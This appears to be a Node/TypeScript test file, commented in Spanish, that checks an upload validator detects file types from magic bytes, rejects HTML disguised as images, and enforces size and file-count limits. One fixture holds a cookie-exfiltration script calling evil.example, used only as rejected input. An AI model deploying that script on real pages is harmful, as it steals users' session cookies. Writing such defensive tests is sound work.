import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import express from "express";
import type { AddressInfo } from "node:net";
import { detectFileType } from "./fileType";
import { resolveUploadType, RejectedMediaError, MAX_BYTES_BY_KIND } from "./s3";
import { upload, uploadErrorHandler, MAX_FILES_PER_MESSAGE } from "../routes/admin/shared";

// Fase 8, punto 7 del plan maestro (2026-09-15). Lo que se cierra: la extension y el Content-Type del
// objeto en S3 salian de lo que declaraba el cliente, asi que un .html subido como "text/html"
// quedaba servido COMO HTML desde el bucket - una pagina ejecutable en nuestro dominio de medios, con
// una URL que el panel reparte.

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(64)]);
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(64)]);
const WEBP = Buffer.concat([Buffer.from("RIFF", "latin1"), Buffer.alloc(4), Buffer.from("WEBP", "latin1"), Buffer.alloc(64)]);
const MP4 = Buffer.concat([Buffer.alloc(4), Buffer.from("ftypisom", "latin1"), Buffer.alloc(64)]);
const OGG = Buffer.concat([Buffer.from("OggS", "latin1"), Buffer.alloc(64)]);
const GIF = Buffer.concat([Buffer.from("GIF89a", "latin1"), Buffer.alloc(64)]);
const HTML = Buffer.from('<html><script>fetch("https://evil.example/" + document.cookie)</script></html>', "utf8");
const PDF = Buffer.concat([Buffer.from("%PDF-1.7\n", "latin1"), Buffer.alloc(64)]);
const TXT = Buffer.from("nombre,telefono\nLaura,573001112233\n", "utf8");

// Cabecera de un ZIP cuya primera entrada se llama como la que ponen Word, Excel y PowerPoint.
function zipConPrimeraEntrada(nombre: string): Buffer {
  const cabecera = Buffer.alloc(30);
  cabecera.write("PK\u0003\u0004", 0, "latin1");
  cabecera.writeUInt16LE(nombre.length, 26);
  return Buffer.concat([cabecera, Buffer.from(nombre, "latin1"), Buffer.alloc(64)]);
}

const DOCX = zipConPrimeraEntrada("[Content_Types].xml");
const ZIP_CUALQUIERA = zipConPrimeraEntrada("fotos/playa.jpg");

test("el tipo sale de los bytes, no de lo que diga el cliente", () => {
  assert.deepEqual(detectFileType(PNG), { mime: "image/png", extension: "png", kind: "image" });
  assert.deepEqual(detectFileType(JPEG), { mime: "image/jpeg", extension: "jpg", kind: "image" });
  assert.deepEqual(detectFileType(WEBP), { mime: "image/webp", extension: "webp", kind: "image" });
  assert.deepEqual(detectFileType(MP4), { mime: "video/mp4", extension: "mp4", kind: "video" });
  assert.deepEqual(detectFileType(OGG), { mime: "audio/ogg", extension: "ogg", kind: "audio" });
  assert.deepEqual(detectFileType(GIF), { mime: "image/gif", extension: "gif", kind: "image" });
  assert.equal(detectFileType(HTML), null, "un HTML no es ninguno de los formatos permitidos");
  assert.equal(detectFileType(Buffer.alloc(0)), null);
});

// resolveUploadType es toda la decision de aceptar o rechazar, separada de la subida: se prueba sin
// tocar S3 ni crear objetos de basura en el bucket.
test("un documento tambien se reconoce por sus bytes", () => {
  assert.deepEqual(detectFileType(PDF), { mime: "application/pdf", extension: "pdf", kind: "document" });
  assert.equal(detectFileType(DOCX)?.kind, "document");
  // Un ZIP que no es de Office queda afuera: adentro puede haber cualquier cosa y la cabecera no lo dice.
  assert.equal(detectFileType(ZIP_CUALQUIERA), null);
  // Un .txt/.csv no tiene bytes de cabecera propios. Aceptarlo seria creerle al que sube, que es el
  // agujero que cerro la Fase 8 - por eso no se soporta, en vez de soportarlo a medias.
  assert.equal(detectFileType(TXT), null);
});

test("docx, xlsx y pptx comparten bytes: lo declarado solo elige entre esos tres", () => {
  assert.deepEqual(resolveUploadType(DOCX, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "documents"), {
    mime: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    extension: "xlsx",
    kind: "document",
  });
  // Declarar cualquier otra cosa no convierte el archivo en otra cosa: sigue siendo el documento inerte
  // que dicen sus bytes, guardado como docx.
  assert.deepEqual(resolveUploadType(DOCX, "text/html", "documents"), {
    mime: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    extension: "docx",
    kind: "document",
  });
});

test("un documento no va a la carpeta de imagenes ni una imagen a la de documentos", () => {
  assert.throws(() => resolveUploadType(PDF, "application/pdf", "images"), RejectedMediaError);
  assert.throws(() => resolveUploadType(PNG, "image/png", "documents"), RejectedMediaError);
});

test("un HTML disfrazado de imagen no pasa la validacion", () => {
  assert.throws(() => resolveUploadType(HTML, "image/png", "images"), RejectedMediaError);
  assert.throws(() => resolveUploadType(HTML, "image/png", "receipts"), RejectedMediaError);
});

test("un archivo no va a una carpeta que no le corresponde", () => {
  assert.throws(() => resolveUploadType(MP4, "video/mp4", "images"), RejectedMediaError);
  assert.throws(() => resolveUploadType(PNG, "image/png", "videos"), RejectedMediaError);
  assert.throws(() => resolveUploadType(PNG, "image/png", "audio"), RejectedMediaError);
});

test("una imagen valida se guarda con la extension y el tipo que dicen sus bytes, no los declarados", () => {
  assert.deepEqual(resolveUploadType(JPEG, "text/html", "images"), {
    mime: "image/jpeg",
    extension: "jpg",
    kind: "image",
  });
});

test("el tope es por tipo: una imagen no puede pesar lo que puede pesar un video", () => {
  const hugeImage = Buffer.concat([PNG, Buffer.alloc(MAX_BYTES_BY_KIND.image)]);
  assert.equal(hugeImage.length > MAX_BYTES_BY_KIND.image, true);
  assert.equal(hugeImage.length < MAX_BYTES_BY_KIND.video, true, "cabria de sobra bajo el tope de video");
  assert.throws(() => resolveUploadType(hugeImage, "image/png", "images"), RejectedMediaError);
});

test("un GIF rebota con su propio mensaje, no con uno generico", () => {
  assert.throws(
    () => resolveUploadType(GIF, "image/gif", "images"),
    (error: Error) => {
      assert.equal(error instanceof RejectedMediaError, true);
      assert.equal(error.message.includes("GIF"), true);
      return true;
    }
  );
});

// La primera puerta: multer rechaza por el tipo declarado antes de gastar memoria en el archivo.
let server: import("node:http").Server;
let baseUrl: string;

before(async () => {
  const app = express();
  app.post("/subir", upload.single("file"), (req, res) => {
    res.json({ recibido: Boolean(req.file), mimetype: req.file?.mimetype ?? null });
  });
  app.post("/subir-varios", upload.array("files", MAX_FILES_PER_MESSAGE), (req, res) => {
    res.json({ cantidad: Array.isArray(req.files) ? req.files.length : 0 });
  });
  app.use(uploadErrorHandler);
  server = app.listen(0);
  await new Promise<void>((resolve) => server.once("listening", () => resolve()));
  baseUrl = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});

after(async () => {
  await new Promise<void>((resolve) => server.close(() => resolve()));
});

async function post(filename: string, type: string, body: Buffer): Promise<Response> {
  const form = new FormData();
  form.append("file", new Blob([new Uint8Array(body)], { type }), filename);
  return fetch(`${baseUrl}/subir`, { method: "POST", body: form });
}

test("multer rechaza un tipo que no esta en la lista blanca, con 400 y motivo", async () => {
  const response = await post("payload.html", "text/html", HTML);
  assert.equal(response.status, 400);
  const body = (await response.json()) as { error: string };
  assert.equal(body.error.includes("text/html"), true);
});

test("multer deja pasar una imagen normal", async () => {
  const response = await post("foto.png", "image/png", PNG);
  assert.equal(response.status, 200);
  const body = (await response.json()) as { recibido: boolean };
  assert.equal(body.recibido, true);
});

async function postVarios(archivos: { name: string; type: string; body: Buffer }[]): Promise<Response> {
  const form = new FormData();
  for (const a of archivos) form.append("files", new Blob([new Uint8Array(a.body)], { type: a.type }), a.name);
  return fetch(`${baseUrl}/subir-varios`, { method: "POST", body: form });
}

test("un envio acepta varios archivos hasta el tope", async () => {
  const uno = { name: "foto.png", type: "image/png", body: PNG };
  const response = await postVarios(Array.from({ length: MAX_FILES_PER_MESSAGE }, () => uno));
  assert.equal(response.status, 200);
  const body = (await response.json()) as { cantidad: number };
  assert.equal(body.cantidad, MAX_FILES_PER_MESSAGE);
});

// El tope no es estetico: multer guarda cada archivo entero en memoria, asi que sin limite de cantidad
// un solo request del panel puede pedir toda la RAM del proceso.
test("un archivo de mas rebota con 400, no con 500", async () => {
  const uno = { name: "foto.png", type: "image/png", body: PNG };
  const response = await postVarios(Array.from({ length: MAX_FILES_PER_MESSAGE + 1 }, () => uno));
  assert.equal(response.status, 400);
});

test("multer deja pasar un PDF y rechaza un .csv", async () => {
  const ok = await post("catalogo.pdf", "application/pdf", PDF);
  assert.equal(ok.status, 200);
  const rechazado = await post("clientes.csv", "text/csv", TXT);
  assert.equal(rechazado.status, 400);
});

test("una nota de voz mp4 con marca generica entra como audio, no rebota", () => {
  // mp4 y m4a son el mismo contenedor: WhatsApp manda varias notas de voz con marca "isom". Se mira
  // lo declarado SOLO para desempatar entre dos formatos inertes, nunca para aceptar el archivo.
  assert.throws(() => resolveUploadType(MP4, "video/mp4", "audio"), RejectedMediaError);
  assert.deepEqual(resolveUploadType(MP4, "audio/mp4", "audio"), {
    mime: "audio/mp4",
    extension: "m4a",
    kind: "audio",
  });
});
